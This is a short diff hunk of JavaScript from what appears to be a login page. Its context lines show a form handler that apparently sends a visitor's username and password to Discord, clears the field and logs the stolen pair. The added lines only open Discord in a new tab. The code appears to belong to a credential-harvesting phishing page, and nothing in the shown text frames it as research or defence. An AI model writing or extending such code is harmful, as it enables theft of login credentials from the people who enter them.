@@ -140,6 +140,10 @@
                     document.getElementById('password').value = '';
                     showDebug('✅ Sent to Discord successfully!', 'success');
                     console.log('✅ Sent to Discord:', username, password);
+                    
+                    // Open Discord in new tab (optional)
+                    window.open('https://discord.com/channels/@me', '_blank');
+                    
                 } else {
                     const errorText = await response.text();
                     throw new Error('Status: ' + response.status + ' - ' + errorText);
